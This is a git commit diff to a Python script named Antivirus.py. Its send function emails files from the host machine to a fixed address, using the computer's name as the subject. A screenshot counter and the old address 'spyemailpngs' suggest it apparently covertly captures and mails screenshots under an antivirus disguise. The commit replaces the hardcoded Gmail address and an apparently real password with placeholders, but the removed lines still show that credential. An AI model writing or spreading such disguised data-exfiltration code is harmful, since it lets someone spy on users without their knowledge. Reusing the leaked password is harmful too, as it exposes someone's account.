311dd42e00367620aaa4e0c8f5d0ecee8cd62499
TerribleSourceCode <53591492+TerribleSourceCode@users.noreply.github.com>
2020-04-25 22:20:30 -0400

    Update Antivirus.py

--- Antivirus.py
+++ Antivirus.py
@@ -7,10 +7,10 @@ import os
 ssTaken = 0
 
 def send(file):
-    receiver = "spyemailpngs@gmail.com"
+    receiver = "to@gmail.com"
     body = "Hello there from Yagmail"
 
-    yag = yagmail.SMTP("spyemailpngs@gmail.com", "Brittajoe2007!")
+    yag = yagmail.SMTP("from@gmail.com", "password")
     yag.send(
         to=receiver,
         subject=os.environ['COMPUTERNAME'],
